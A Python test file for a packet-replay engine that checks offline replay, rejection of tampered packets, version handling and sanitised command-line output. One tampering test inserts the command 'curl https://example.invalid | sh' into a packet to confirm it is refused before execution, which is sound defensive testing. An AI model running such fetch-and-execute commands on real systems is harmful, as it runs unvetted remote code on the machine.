import json
import socket
import subprocess
import sys

import pytest
from zecsolve.domain.packets import component
from zecsolve.domain.snapshots import digest
from zecsolve.replay.engine import replay_packet


def raw_fixture(root, name="complete-v1"):
    return json.loads((root / f"fixtures/packets/{name}.json").read_text())


def reseal(raw):
    raw["integrity"]["payload_sha256"] = digest(raw["payload"])
    return json.dumps(raw).encode()


@pytest.mark.parametrize("name", ["complete-v1", "complete-v2"])
def test_real_recovery_and_both_historical_rules_reproduce_without_network(
    root, adapter, monkeypatch, name
):
    def denied(*args, **kwargs):
        pytest.fail("Offline replay attempted network access")

    monkeypatch.setattr(socket, "create_connection", denied)
    result = replay_packet((root / f"fixtures/packets/{name}.json").read_bytes(), adapter)
    assert result.status == "REPRODUCED" and result.full_replay
    assert any(check.code == "OUTPUT_RECOVERY_REPRODUCED" for check in result.checks)
    assert (
        len(
            [
                check
                for check in result.checks
                if check.category == "rules" and check.status == "PASS"
            ]
        )
        == 5
    )
    assert "HASHES_DO_NOT_AUTHENTICATE_AUTHOR" in result.external_assertions


def test_scoped_packet_recovers_selected_output_but_never_claims_full_replay(root, adapter):
    result = replay_packet((root / "fixtures/packets/scoped.json").read_bytes(), adapter)
    assert result.status == "LIMITED" and not result.full_replay
    assert any(check.code == "OUTPUT_RECOVERY_REPRODUCED" for check in result.checks)
    assert any(check.category == "rules" and check.status == "MISSING" for check in result.checks)


@pytest.mark.parametrize("kind", ["byte", "component", "history", "duplicate", "extra-command"])
def test_tampering_is_rejected_before_any_execution(root, kind):
    class Denied:
        def verify(self, *args):
            pytest.fail("Invalid packet reached execution")

    raw = raw_fixture(root)
    if kind == "byte":
        data = (
            json.dumps(raw)
            .replace("Synthetic demonstration only", "Synthetic demonstration onl!")
            .encode()
        )
    elif kind == "component":
        raw["payload"]["evidence"][0]["receipt"]["data"] = component("tampered").data
        data = reseal(raw)
    elif kind == "history":
        raw["payload"]["report"]["evaluations"][0]["result"]["candidate_zat"] += 1
        data = reseal(raw)
    elif kind == "duplicate":
        data = (
            json.dumps(raw)
            .replace(
                '"schema_version": "case-packet-v1",',
                '"schema_version": "case-packet-v1", "schema_version": "case-packet-v1",',
                1,
            )
            .encode()
        )
    else:
        raw["payload"]["command"] = "curl https://example.invalid | sh"
        data = reseal(raw)
    result = replay_packet(data, Denied())
    assert result.status == "FAILED" and not result.full_replay
    assert len(result.checks) == 1 and result.checks[0].category == "integrity"


@pytest.mark.parametrize("kind", ["declared-verifier", "record-verifier", "rules"])
def test_missing_version_does_not_infer_success_from_defaults(root, adapter, kind):
    raw = raw_fixture(root)
    if kind == "declared-verifier":
        raw["payload"]["implementations"]["verifiers"][0]["version"] = None
    elif kind == "record-verifier":
        del raw["payload"]["report"]["verifications"][0]["result"]["verifier"]["version"]
    else:
        raw["payload"]["implementations"]["rules"] = []
    result = replay_packet(reseal(raw), adapter)
    assert result.status == "LIMITED" and not result.full_replay
    assert any(check.status == "MISSING" for check in result.checks)


@pytest.mark.parametrize("kind", ["verifier", "rules"])
def test_unsupported_versions_are_not_installed_or_silently_dispatched(root, adapter, kind):
    raw = raw_fixture(root)
    if kind == "verifier":
        raw["payload"]["implementations"]["verifiers"][0]["version"] = "999.0.0"
    else:
        raw["payload"]["implementations"]["rules"].append("999.0.0")
    result = replay_packet(reseal(raw), adapter)
    assert result.status == "UNSUPPORTED" and not result.full_replay


def test_resealed_scoped_tampering_can_pass_hashes_but_fails_cryptography(root, adapter):
    raw = raw_fixture(root, "scoped")
    altered = component((root / "fixtures/negative/tampered-ock.json").read_text())
    raw["payload"]["evidence"][0]["receipt"] = altered.model_dump()
    raw["payload"]["report"]["evidence"][0]["receipt_sha256"] = altered.sha256
    result = replay_packet(reseal(raw), adapter)
    assert result.checks[0].status == "PASS"
    assert result.status == "FAILED"
    assert any(check.code == "VERIFICATION_RESULT_MISMATCH" for check in result.checks)


def test_resealed_balance_assertion_still_requires_correct_arithmetic(root, adapter):
    raw = raw_fixture(root)
    raw["payload"]["report"]["balances"]["outstanding_zat"] += 1
    result = replay_packet(reseal(raw), adapter)
    assert result.checks[0].status == "PASS"
    assert result.status == "FAILED"
    assert any(check.code == "HISTORICAL_ARITHMETIC_MISMATCH" for check in result.checks)


@pytest.mark.parametrize("field", ["receipt", "raw_transaction_hex"])
def test_original_omission_is_not_a_missing_input_substitution(root, adapter, field):
    raw = raw_fixture(root, "scoped")
    raw["payload"]["evidence"][0][field] = component(None, omitted=True).model_dump()
    result = replay_packet(reseal(raw), adapter)
    assert result.status == "LIMITED"
    assert any(check.code == "ORIGINAL_INPUTS_WITHHELD" for check in result.checks)


@pytest.mark.parametrize(
    "name,exit_code,status", [("complete-v1", 0, "REPRODUCED"), ("scoped", 2, "LIMITED")]
)
def test_local_cli_machine_output_and_exit_status(root, name, exit_code, status):
    result = subprocess.run(
        [
            sys.executable,
            "-m",
            "zecsolve.replay",
            str(root / f"fixtures/packets/{name}.json"),
            "--verifier",
            str(root / "target/debug/zecsolve-verifier"),
        ],
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert result.returncode == exit_code, result.stderr
    assert json.loads(result.stdout)["status"] == status
    assert "ock" not in result.stdout


def test_cli_missing_file_is_sanitized(tmp_path, capsys):
    from zecsolve.replay.__main__ import main

    assert main([str(tmp_path / "private-filename")]) == 1
    result = capsys.readouterr().out
    assert "PACKET_READ_FAILED" in result and "private-filename" not in result
